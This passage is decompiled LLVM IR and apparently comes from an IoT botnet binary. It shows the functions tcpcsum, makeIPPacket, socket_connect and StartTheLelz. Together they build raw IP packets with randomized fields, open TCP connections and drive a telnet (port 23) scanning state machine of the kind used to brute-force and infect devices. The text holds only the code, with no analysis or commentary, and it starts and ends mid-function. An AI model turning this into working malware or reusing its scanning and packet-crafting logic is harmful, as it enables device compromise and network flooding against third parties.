  %sext = mul i32 %v2_8049d21, 65536
  %v4_8049d2b = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_8049d23, 65536
  %v4_8049d2e = sdiv i32 %sext50, 65536
  %v3_8049d31 = udiv i32 %v4_8049d2b, 65536
  %v5_8049d31 = or i32 %sext50, %v3_8049d31
  %v2_8049d35 = udiv i32 %v4_8049d2e, 65536
  %v2_8049d38 = or i32 %v5_8049d31, %v2_8049d35
  %v3_8049d38 = icmp eq i32 %v2_8049d38, 0
  %v1_8049d3c = icmp eq i1 %v3_8049d38, false
  br i1 %v1_8049d3c, label %dec_label_pc_8049d06, label %dec_label_pc_8049d2b.dec_label_pc_8049d3e_crit_edge

dec_label_pc_8049d2b.dec_label_pc_8049d3e_crit_edge: ; preds = %dec_label_pc_8049d06
  store i32 %v5_8049d3130, i32* @ecx, align 4
  br label %dec_label_pc_8049d3e

dec_label_pc_8049d3e:                             ; preds = %dec_label_pc_8049d2b.dec_label_pc_8049d3e_crit_edge, %dec_label_pc_8049d2b.preheader
  %v4_8049d2b.lcssa = phi i32 [ %v4_8049d2b, %dec_label_pc_8049d2b.dec_label_pc_8049d3e_crit_edge ], [ %v4_8049d2b20, %dec_label_pc_8049d2b.preheader ]
  %v1_8049d41 = urem i32 %v4_8049d2b.lcssa, 65536
  %v1_8049d43 = xor i32 %v1_8049d41, 65535
  store i32 %v0_8049cad, i32* @ebx, align 4
  ret i32 %v1_8049d43

; uselistorder directives
  uselistorder i32 %v5_8049d31, { 1, 0 }
  uselistorder i32 %v4_8049d2b, { 1, 0, 2 }
  uselistorder i32 %v2_8049d3525, { 1, 0 }
  uselistorder i32 %v4_8049d2e21, { 1, 0 }
  uselistorder i32 %v4_8049d2b20, { 2, 1, 0 }
  uselistorder i32 %v4_8049cfe, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_8049cd3.lcssa, { 1, 0 }
  uselistorder i32 %v4_8049ce1, { 1, 0 }
  uselistorder i32 %v6_8049cd3, { 1, 2, 0 }
  uselistorder i32 %v4_8049cd3, { 1, 0 }
  uselistorder i32 %v6_8049cc4, { 1, 0 }
  uselistorder label %dec_label_pc_8049d06, { 1, 0 }
  uselistorder label %dec_label_pc_8049cc1, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %v1_8049d64 = add i32 %tmp9, 12
  %v2_8049d64 = inttoptr i32 %v1_8049d64 to i32*
  %v3_8049d64 = load i32, i32* %v2_8049d64, align 4
  %v1_8049d6d = add i32 %tmp9, 16
  %v2_8049d6d = inttoptr i32 %v1_8049d6d to i32*
  %v3_8049d6d = load i32, i32* %v2_8049d6d, align 4
  %v1_8049d80 = call i32 @htons(i32 20)
  %v1_8049d9a = call i32 @malloc(i32 32)
  store i32 %v1_8049d9a, i32* %ecx.global-to-local, align 4
  %v2_8049dad = inttoptr i32 %v1_8049d9a to i32*
  store i32 %v3_8049d64, i32* %v2_8049dad, align 4
  %v1_8049db2 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049db2 = add i32 %v1_8049db2, 4
  %v3_8049db2 = inttoptr i32 %v2_8049db2 to i32*
  store i32 %v3_8049d6d, i32* %v3_8049db2, align 4
  %v1_8049db8 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049db8 = add i32 %v1_8049db8, 8
  %v3_8049db8 = inttoptr i32 %v2_8049db8 to i32*
  store i32 0, i32* %v3_8049db8, align 4
  store i32 %tmp1, i32* @ecx, align 4
  %v1_8049dc1 = add i32 %v1_8049d9a, 12
  store i32 %v1_8049dc1, i32* %edx.global-to-local, align 4
  %v1_8049dc4 = inttoptr i32 %tmp1 to i32*
  %v2_8049dc4 = load i32, i32* %v1_8049dc4, align 4
  %v2_8049dc6 = inttoptr i32 %v1_8049dc1 to i32*
  store i32 %v2_8049dc4, i32* %v2_8049dc6, align 4
  %v0_8049dc8 = load i32, i32* @ecx, align 4
  %v1_8049dc8 = add i32 %v0_8049dc8, 4
  %v2_8049dc8 = inttoptr i32 %v1_8049dc8 to i32*
  %v3_8049dc8 = load i32, i32* %v2_8049dc8, align 4
  %v1_8049dcb = load i32, i32* %edx.global-to-local, align 4
  %v2_8049dcb = add i32 %v1_8049dcb, 4
  %v3_8049dcb = inttoptr i32 %v2_8049dcb to i32*
  store i32 %v3_8049dc8, i32* %v3_8049dcb, align 4
  %v0_8049dce = load i32, i32* @ecx, align 4
  %v1_8049dce = add i32 %v0_8049dce, 8
  %v2_8049dce = inttoptr i32 %v1_8049dce to i32*
  %v3_8049dce = load i32, i32* %v2_8049dce, align 4
  %v1_8049dd1 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049dd1 = add i32 %v1_8049dd1, 8
  %v3_8049dd1 = inttoptr i32 %v2_8049dd1 to i32*
  store i32 %v3_8049dce, i32* %v3_8049dd1, align 4
  %v0_8049dd4 = load i32, i32* @ecx, align 4
  %v1_8049dd4 = add i32 %v0_8049dd4, 12
  %v2_8049dd4 = inttoptr i32 %v1_8049dd4 to i32*
  %v3_8049dd4 = load i32, i32* %v2_8049dd4, align 4
  %v1_8049dd7 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049dd7 = add i32 %v1_8049dd7, 12
  %v3_8049dd7 = inttoptr i32 %v2_8049dd7 to i32*
  store i32 %v3_8049dd4, i32* %v3_8049dd7, align 4
  %v0_8049dda = load i32, i32* @ecx, align 4
  %v1_8049dda = add i32 %v0_8049dda, 16
  %v2_8049dda = inttoptr i32 %v1_8049dda to i32*
  %v3_8049dda = load i32, i32* %v2_8049dda, align 4
  %v1_8049ddd = load i32, i32* %edx.global-to-local, align 4
  %v2_8049ddd = add i32 %v1_8049ddd, 16
  %v3_8049ddd = inttoptr i32 %v2_8049ddd to i32*
  store i32 %v3_8049dda, i32* %v3_8049ddd, align 4
  %v2_8049de6 = inttoptr i32 %v1_8049d9a to i16*
  %v3_8049de6 = call i32 @csum(i16* %v2_8049de6, i32 32)
  %v1_8049df8 = call i32 @free(i32 %v1_8049d9a)
  %v4_8049e00 = urem i32 %v3_8049de6, 65536
  ret i32 %v4_8049e00

; uselistorder directives
  uselistorder i32 %v1_8049d9a, { 2, 3, 4, 1, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp1, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_8049e0b = load i32, i32* @ebp, align 4
  store i32 %v0_8049e0b, i32* %stack_var_-4, align 4
  %v4_8049e11 = sext i8 %tmp8 to i32
  %v4_8049e17 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_8049e34 = add i32 %v4_8049e17, 1
  %v2_8049e34 = inttoptr i32 %v1_8049e34 to i8*
  store i8 0, i8* %v2_8049e34, align 1
  %v1_8049e3b = add i32 %tmp5, 20
  %v1_8049e41 = trunc i32 %v1_8049e3b to i16
  %v3_8049e41 = add i32 %v4_8049e17, 2
  %v4_8049e41 = inttoptr i32 %v3_8049e41 to i16*
  store i16 %v1_8049e41, i16* %v4_8049e41, align 2
  %v2_8049e45 = call i32 @rand_cmwc(i32 %v4_8049e11)
  %v1_8049e4f = trunc i32 %v2_8049e45 to i16
  %v3_8049e4f = add i32 %v4_8049e17, 4
  %v4_8049e4f = inttoptr i32 %v3_8049e4f to i16*
  store i16 %v1_8049e4f, i16* %v4_8049e4f, align 2
  %v1_8049e56 = add i32 %v4_8049e17, 6
  %v2_8049e56 = inttoptr i32 %v1_8049e56 to i16*
  store i16 0, i16* %v2_8049e56, align 2
  %v1_8049e5f = add i32 %v4_8049e17, 8
  %v2_8049e5f = inttoptr i32 %v1_8049e5f to i8*
  store i8 -1, i8* %v2_8049e5f, align 1
  %v3_8049e69 = add i32 %v4_8049e17, 9
  %v4_8049e69 = inttoptr i32 %v3_8049e69 to i8*
  store i8 %tmp8, i8* %v4_8049e69, align 1
  %v1_8049e6f = add i32 %v4_8049e17, 10
  %v2_8049e6f = inttoptr i32 %v1_8049e6f to i16*
  store i16 0, i16* %v2_8049e6f, align 2
  %v2_8049e7b = add i32 %v4_8049e17, 12
  %v3_8049e7b = inttoptr i32 %v2_8049e7b to i32*
  %v2_8049e84 = add i32 %v4_8049e17, 16
  %v3_8049e84 = inttoptr i32 %v2_8049e84 to i32*
  store i32 %tmp, i32* %v3_8049e84, align 4
  %v2_8049e87 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049e87, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 3, 0, 1, 2 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8049e8f = add i32 %arg1, -2
  %v9_8049e8f = sub i32 1, %arg1
  %v10_8049e8f = and i32 %v9_8049e8f, %arg1
  %v11_8049e8f = icmp slt i32 %v10_8049e8f, 0
  %v12_8049e8f = icmp eq i32 %v4_8049e8f, 0
  %v13_8049e8f = icmp slt i32 %v4_8049e8f, 0
  %v3_8049e93 = icmp eq i1 %v13_8049e8f, %v11_8049e8f
  %v4_8049e93 = icmp eq i1 %v12_8049e8f, false
  %v5_8049e93 = and i1 %v4_8049e93, %v3_8049e93
  br i1 %v5_8049e93, label %dec_label_pc_8049e9e, label %dec_label_pc_8049eb3

dec_label_pc_8049e9e:                             ; preds = %entry
  %v1_8049ea4 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_8049eb3

dec_label_pc_8049eb3:                             ; preds = %entry, %dec_label_pc_8049e9e
  %storemerge = phi i32 [ 0, %dec_label_pc_8049e9e ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049e8f, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049eb3, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_8049ed2 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_8049edd = icmp eq i32 %v1_8049ed2, 0
  %v1_8049ee1 = icmp eq i1 %v4_8049edd, false
  br i1 %v1_8049ee1, label %dec_label_pc_8049eef, label %dec_label_pc_8049ee3

dec_label_pc_8049ee3:                             ; preds = %entry
  br label %dec_label_pc_8049f94

dec_label_pc_8049eef:                             ; preds = %entry
  %v1_8049ef2 = add i32 %v1_8049ed2, 12
  %v2_8049ef2 = inttoptr i32 %v1_8049ef2 to i32*
  %v3_8049ef2 = load i32, i32* %v2_8049ef2, align 4
  %v1_8049efa = add i32 %v1_8049ed2, 16
  %v2_8049efa = inttoptr i32 %v1_8049efa to i32*
  %v3_8049efa = load i32, i32* %v2_8049efa, align 4
  %v1_8049efd = inttoptr i32 %v3_8049efa to i32*
  %v2_8049efd = load i32, i32* %v1_8049efd, align 4
  %v15_8049f06 = ptrtoint i32* %stack_var_-24 to i32
  %v3_8049f0b = call i32 @bcopy(i32 %v2_8049efd, i32 %v15_8049f06, i32 %v3_8049ef2)
  %v1_8049f161 = zext i16 %arg2 to i32
  %v1_8049f1f = call i32 @htons(i32 %v1_8049f161)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_8049f3a = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_8049f45 = ptrtoint i32* %stack_var_-32 to i32
  %v5_8049f55 = call i32 @__GI_setsockopt(i32 %v3_8049f3a, i32 6, i32 1, i32 %v2_8049f45, i32 4)
  %v13_8049f5d = icmp eq i32 %v3_8049f3a, -1
  %v1_8049f61 = icmp eq i1 %v13_8049f5d, false
  br i1 %v1_8049f61, label %dec_label_pc_8049f6c, label %dec_label_pc_8049f63

dec_label_pc_8049f63:                             ; preds = %dec_label_pc_8049eef
  br label %dec_label_pc_8049f94

dec_label_pc_8049f6c:                             ; preds = %dec_label_pc_8049eef
  %v2_8049f03 = ptrtoint i32* %stack_var_-28 to i32
  %v3_8049f78 = call i32 @__libc_connect(i32 %v3_8049f3a, i32 %v2_8049f03, i32 16)
  %v10_8049f80 = icmp eq i32 %v3_8049f78, -1
  %v1_8049f83 = icmp eq i1 %v10_8049f80, false
  br i1 %v1_8049f83, label %dec_label_pc_8049f8e, label %dec_label_pc_8049f85

dec_label_pc_8049f85:                             ; preds = %dec_label_pc_8049f6c
  br label %dec_label_pc_8049f94

dec_label_pc_8049f8e:                             ; preds = %dec_label_pc_8049f6c
  br label %dec_label_pc_8049f94

dec_label_pc_8049f94:                             ; preds = %dec_label_pc_8049f85, %dec_label_pc_8049f63, %dec_label_pc_8049ee3, %dec_label_pc_8049f8e
  %v3_8049f94 = phi i32 [ 0, %dec_label_pc_8049f85 ], [ 0, %dec_label_pc_8049f63 ], [ 0, %dec_label_pc_8049ee3 ], [ %v3_8049f3a, %dec_label_pc_8049f8e ]
  ret i32 %v3_8049f94

; uselistorder directives
  uselistorder i32 %v3_8049f3a, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_8049f94, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-636 = alloca i32, align 4
  %v15_8049f9f = ptrtoint i32* %stack_var_-636 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8049fb0 = call i32 @__GI_time(i32* null)
  store i32 %v2_8049fb0, i32* %eax.global-to-local, align 4
  store i32 %v2_8049fb0, i32* @ebx, align 4
  %v1_8049fba = call i32 @rand_cmwc(i32 0)
  %v1_8049fbf = load i32, i32* @ebx, align 4
  %v2_8049fbf = xor i32 %v1_8049fbf, %v1_8049fba
  store i32 %v2_8049fbf, i32* @eax, align 4
  %v1_8049fc5 = call i32 @srand(i32 %v2_8049fbf)
  store i32 %v1_8049fc5, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-604, align 4
  %v1_8049fdb = call i32 @htons(i32 23)
  %v2_8049fea = ptrtoint i32* %stack_var_-604 to i32
  %v15_8049ff0 = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v15_8049ff0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-596, align 4
  %v1_804a008 = call i32 @malloc(i32 1025)
  store i32 %v1_804a008, i32* %edx.global-to-local, align 4
  store i32 1025, i32* %eax.global-to-local, align 4
  %v3_804a024 = inttoptr i32 %v1_804a008 to i8*
  %v4_804a024 = call i32 @__GI_memset(i8* %v3_804a024, i32 0, i32 1025)
  %v2_804a03d = mul i32 %arg2, 28
  %v1_804a042 = add i32 %v2_804a03d, 30
  %v2_804a045 = and i32 %v1_804a042, -16
  %v2_804a04b = sub i32 %v15_8049f9f, %v2_804a045
  %v1_804a059 = add i32 %v2_804a04b, 15
  %v2_804a05c = and i32 %v1_804a059, -16
  %v2_804a079 = mul i32 %arg2, 5
  store i32 %v2_804a079, i32* %edx.global-to-local, align 4
  %v1_804a07f = inttoptr i32 %v2_804a05c to i8*
  store i32 %v2_804a05c, i32* @edi, align 4
  %v1_804a084 = and i32 %v1_804a059, -256
  store i32 %v1_804a084, i32* %eax.global-to-local, align 4
  %v5_804a086 = call i8* @_memset(i8* %v1_804a07f, i32 %v1_804a084, i32 %v2_804a079)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a11350 = icmp sgt i32 %arg2, 0
  br i1 %v5_804a11350, label %dec_label_pc_804a091.lr.ph, label %dec_label_pc_804a120

dec_label_pc_804a091.lr.ph:                       ; preds = %entry
  %v2_804a0e5 = or i32 %v2_804a05c, 9
  br label %dec_label_pc_804a091

dec_label_pc_804a091:                             ; preds = %dec_label_pc_804a091, %dec_label_pc_804a091.lr.ph
  %storemerge251 = phi i32 [ 0, %dec_label_pc_804a091.lr.ph ], [ %v4_804a10a, %dec_label_pc_804a091 ]
  %v2_804a0a5 = mul i32 %storemerge251, 28
  %v2_804a0a7 = add i32 %v2_804a0a5, %v2_804a05c
  store i32 %v2_804a0a7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804a0af = inttoptr i32 %v2_804a0a7 to i32*
  store i32 0, i32* %v2_804a0af, align 4
  %v0_804a0b1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0b1 = add i32 %v0_804a0b1, 4
  store i32 %v1_804a0b1, i32* %eax.global-to-local, align 4
  %v0_804a0b4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0b4 = inttoptr i32 %v1_804a0b1 to i32*
  store i32 %v0_804a0b4, i32* %v2_804a0b4, align 4
  %v0_804a0b6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0b6 = add i32 %v0_804a0b6, 4
  store i32 %v1_804a0b6, i32* %eax.global-to-local, align 4
  %v0_804a0b9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0b9 = inttoptr i32 %v1_804a0b6 to i32*
  store i32 %v0_804a0b9, i32* %v2_804a0b9, align 4
  %v0_804a0bb = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0bb = add i32 %v0_804a0bb, 4
  store i32 %v1_804a0bb, i32* %eax.global-to-local, align 4
  %v0_804a0be = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0be = inttoptr i32 %v1_804a0bb to i32*
  store i32 %v0_804a0be, i32* %v2_804a0be, align 4
  %v0_804a0c0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0c0 = add i32 %v0_804a0c0, 4
  store i32 %v1_804a0c0, i32* %eax.global-to-local, align 4
  %v0_804a0c3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0c3 = inttoptr i32 %v1_804a0c0 to i32*
  store i32 %v0_804a0c3, i32* %v2_804a0c3, align 4
  %v0_804a0c5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0c5 = add i32 %v0_804a0c5, 4
  store i32 %v1_804a0c5, i32* %eax.global-to-local, align 4
  %v0_804a0c8 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0c8 = inttoptr i32 %v1_804a0c5 to i32*
  store i32 %v0_804a0c8, i32* %v2_804a0c8, align 4
  %v0_804a0ca = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0ca = add i32 %v0_804a0ca, 4
  %v0_804a0cd = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0cd = inttoptr i32 %v1_804a0ca to i32*
  store i32 %v0_804a0cd, i32* %v2_804a0cd, align 4
  %v3_804a0e5 = add i32 %v2_804a0e5, %v2_804a0a5
  %v4_804a0e5 = inttoptr i32 %v3_804a0e5 to i8*
  store i8 1, i8* %v4_804a0e5, align 1
  %v1_804a102 = add i32 %v2_804a0a7, 24
  store i32 %v1_804a102, i32* %edx.global-to-local, align 4
  %v2_804a108 = inttoptr i32 %v1_804a102 to i32*
  store i32 %v1_804a008, i32* %v2_804a108, align 4
  %v4_804a10a = add nuw nsw i32 %storemerge251, 1
  store i32 %v4_804a10a, i32* %eax.global-to-local, align 4
  %exitcond52 = icmp eq i32 %v4_804a10a, %arg2
  br i1 %exitcond52, label %dec_label_pc_804a120, label %dec_label_pc_804a091

dec_label_pc_804a120:                             ; preds = %entry, %dec_label_pc_804a091, %dec_label_pc_804a120
  %stack_var_-48.0 = phi i32 [ %v4_804a120, %dec_label_pc_804a120 ], [ 0, %dec_label_pc_804a091 ], [ 0, %entry ]
  %v4_804a120 = add i32 %stack_var_-48.0, 1
  store i32 %v4_804a120, i32* %eax.global-to-local, align 4
  %v1_804a126 = mul i32 %v4_804a120, 4
  %v2_804a126 = add i32 %v1_804a126, ptrtoint ([10 x i8*]* @global_var_8058160.51 to i32)
  %v3_804a126 = inttoptr i32 %v2_804a126 to i32*
  %v4_804a126 = load i32, i32* %v3_804a126, align 4
  store i32 %v4_804a126, i32* %eax.global-to-local, align 4
  %v1_804a12d = icmp eq i32 %v4_804a126, 0
  %v1_804a12f = icmp eq i1 %v1_804a12d, false
  br i1 %v1_804a12f, label %dec_label_pc_804a120, label %dec_label_pc_804a131.preheader

dec_label_pc_804a131.preheader:                   ; preds = %dec_label_pc_804a120
  %v2_804a547 = ptrtoint i32* %stack_var_-316 to i32
  %tmp38 = bitcast i32* %stack_var_-316 to i8*
  %v2_804a5ca = ptrtoint i32* %stack_var_-324 to i32
  %v2_804a622 = ptrtoint i32* %stack_var_-328 to i32
  %v2_804a629 = ptrtoint i32* %stack_var_-332 to i32
  %v2_804a1a2 = or i32 %v2_804a05c, 8
  %v2_804a1e5 = or i32 %v2_804a05c, 9
  %v2_804a2d4 = or i32 %v2_804a05c, 11
  %v2_804a30e = or i32 %v2_804a05c, 10
  %v2_804ad09 = add i32 %v2_804a05c, 16
  br label %dec_label_pc_804a131

dec_label_pc_804a131:                             ; preds = %dec_label_pc_804a131, %dec_label_pc_804b080, %dec_label_pc_804a131.preheader
  %stack_var_-624.0 = phi i32 [ %tmp4, %dec_label_pc_804a131.preheader ], [ %stack_var_-624.0, %dec_label_pc_804a131 ], [ %stack_var_-624.1, %dec_label_pc_804b080 ]
  %stack_var_-620.0 = phi i32 [ %tmp5, %dec_label_pc_804a131.preheader ], [ %stack_var_-620.0, %dec_label_pc_804a131 ], [ %stack_var_-620.1, %dec_label_pc_804b080 ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804a11350, label %dec_label_pc_804a13d, label %dec_label_pc_804a131

dec_label_pc_804a13d:                             ; preds = %dec_label_pc_804a131, %dec_label_pc_804b080
  %storemerge45 = phi i32 [ %v4_804b080, %dec_label_pc_804b080 ], [ 0, %dec_label_pc_804a131 ]
  %stack_var_-620.244 = phi i32 [ %stack_var_-620.1, %dec_label_pc_804b080 ], [ %stack_var_-620.0, %dec_label_pc_804a131 ]
  %stack_var_-624.243 = phi i32 [ %stack_var_-624.1, %dec_label_pc_804b080 ], [ %stack_var_-624.0, %dec_label_pc_804a131 ]
  %v1_804a143 = mul i32 %storemerge45, 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  %v2_804a151 = mul i32 %storemerge45, 28
  %v2_804a153 = add i32 %v2_804a151, %v2_804a05c
  %v1_804a155 = add i32 %v2_804a153, 16
  store i32 %v1_804a155, i32* %eax.global-to-local, align 4
  %v1_804a158 = inttoptr i32 %v1_804a155 to i32*
  %v2_804a158 = load i32, i32* %v1_804a158, align 4
  store i32 %v2_804a158, i32* %eax.global-to-local, align 4
  %v1_804a15a = icmp eq i32 %v2_804a158, 0
  %v1_804a15c = icmp eq i1 %v1_804a15a, false
  br i1 %v1_804a15c, label %dec_label_pc_804a18c, label %dec_label_pc_804a15e

dec_label_pc_804a15e:                             ; preds = %dec_label_pc_804a13d
  store i32 %storemerge45, i32* @ebx, align 4
  %v0_804a161 = load i32, i32* @esp, align 4
  %v1_804a164 = add i32 %v0_804a161, -16
  %v2_804a164 = inttoptr i32 %v1_804a164 to i32*
  store i32 0, i32* %v2_804a164, align 4
  %v1_804a166 = inttoptr i32 %storemerge45 to i32*
  %v2_804a166 = call i32 @__GI_time(i32* %v1_804a166)
  store i32 %v2_804a166, i32* @esi, align 4
  %v0_804a173 = load i32, i32* @ebx, align 4
  %v1_804a175 = mul i32 %v0_804a173, 4
  store i32 %v1_804a175, i32* %edx.global-to-local, align 4
  %v2_804a183 = mul i32 %v0_804a173, 28
  %v2_804a185 = add i32 %v2_804a183, %v2_804a05c
  %v1_804a187 = add i32 %v2_804a185, 16
  store i32 %v1_804a187, i32* %eax.global-to-local, align 4
  %v2_804a18a = inttoptr i32 %v1_804a187 to i32*
  store i32 %v2_804a166, i32* %v2_804a18a, align 4
  br label %dec_label_pc_804a18c

dec_label_pc_804a18c:                             ; preds = %dec_label_pc_804a13d, %dec_label_pc_804a15e
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804a1a2 = add i32 %v2_804a1a2, %v2_804a151
  %v4_804a1a2 = inttoptr i32 %v3_804a1a2 to i8*
  %v5_804a1a2 = load i8, i8* %v4_804a1a2, align 4
  %v6_804a1a2 = zext i8 %v5_804a1a2 to i32
  %v8_804a1a2 = and i32 %v2_804a151, -256
  %v9_804a1a2 = or i32 %v6_804a1a2, %v8_804a1a2
  store i32 %v9_804a1a2, i32* %eax.global-to-local, align 4
  store i32 %v6_804a1a2, i32* %edx.global-to-local, align 4
  store i32 %v6_804a1a2, i32* @edi, align 4
  %v1_804a1c6 = mul nuw nsw i32 %v6_804a1a2, 4
  %v2_804a1c6 = add nuw nsw i32 %v1_804a1c6, 134567908
  %v3_804a1c6 = inttoptr i32 %v2_804a1c6 to i32*
  %v4_804a1c6 = load i32, i32* %v3_804a1c6, align 4
  store i32 %v4_804a1c6, i32* %eax.global-to-local, align 4
  switch i8 %v5_804a1a2, label %dec_label_pc_804b080 [
    i8 0, label %dec_label_pc_804a1cf
    i8 1, label %dec_label_pc_804a53d
    i8 2, label %dec_label_pc_804a782
    i8 3, label %dec_label_pc_804a8be
    i8 4, label %dec_label_pc_804aa06
    i8 5, label %dec_label_pc_804ab42
    i8 6, label %dec_label_pc_804ac8a
    i8 7, label %dec_label_pc_804af24
  ]

dec_label_pc_804a1cf:                             ; preds = %dec_label_pc_804a18c
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804a1e5 = add i32 %v2_804a1e5, %v2_804a151
  %v4_804a1e5 = inttoptr i32 %v3_804a1e5 to i8*
  %v5_804a1e5 = load i8, i8* %v4_804a1e5, align 1
  %v10_804a1e9 = icmp eq i8 %v5_804a1e5, 1
  %v1_804a1eb = icmp eq i1 %v10_804a1e9, false
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  br i1 %v1_804a1eb, label %dec_label_pc_804a29a, label %dec_label_pc_804a1f1

dec_label_pc_804a1f1:                             ; preds = %dec_label_pc_804a1cf
  %v1_804a209 = add i32 %v2_804a153, 24
  store i32 %v1_804a209, i32* %eax.global-to-local, align 4
  %v1_804a20c = inttoptr i32 %v1_804a209 to i32*
  %v2_804a20c = load i32, i32* %v1_804a20c, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804a22f = inttoptr i32 %v2_804a153 to i32*
  store i32 0, i32* %v2_804a22f, align 4
  %v0_804a231 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a231 = add i32 %v0_804a231, 4
  store i32 %v1_804a231, i32* %eax.global-to-local, align 4
  %v0_804a234 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a234 = inttoptr i32 %v1_804a231 to i32*
  store i32 %v0_804a234, i32* %v2_804a234, align 4
  %v0_804a236 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a236 = add i32 %v0_804a236, 4
  store i32 %v1_804a236, i32* %eax.global-to-local, align 4
  %v0_804a239 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a239 = inttoptr i32 %v1_804a236 to i32*
  store i32 %v0_804a239, i32* %v2_804a239, align 4
  %v0_804a23b = load i32, i32* %eax.global-to-local, align 4
  %v1_804a23b = add i32 %v0_804a23b, 4
  store i32 %v1_804a23b, i32* %eax.global-to-local, align 4
  %v0_804a23e = load i32, i32* %edx.global-to-local, align 4
  %v2_804a23e = inttoptr i32 %v1_804a23b to i32*
  store i32 %v0_804a23e, i32* %v2_804a23e, align 4
  %v0_804a240 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a240 = add i32 %v0_804a240, 4
  store i32 %v1_804a240, i32* %eax.global-to-local, align 4
  %v0_804a243 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a243 = inttoptr i32 %v1_804a240 to i32*
  store i32 %v0_804a243, i32* %v2_804a243, align 4
  %v0_804a245 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a245 = add i32 %v0_804a245, 4
  store i32 %v1_804a245, i32* %eax.global-to-local, align 4
  %v0_804a248 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a248 = inttoptr i32 %v1_804a245 to i32*
  store i32 %v0_804a248, i32* %v2_804a248, align 4
  %v0_804a24a = load i32, i32* %eax.global-to-local, align 4
  %v1_804a24a = add i32 %v0_804a24a, 4
  %v0_804a24d = load i32, i32* %edx.global-to-local, align 4
  %v2_804a24d = inttoptr i32 %v1_804a24a to i32*
  store i32 %v0_804a24d, i32* %v2_804a24d, align 4
  store i32 %v1_804a209, i32* %edx.global-to-local, align 4
  store i32 %v2_804a20c, i32* @eax, align 4
  store i32 %v2_804a20c, i32* %v1_804a20c, align 4
  store i32 %storemerge45, i32* @ebx, align 4
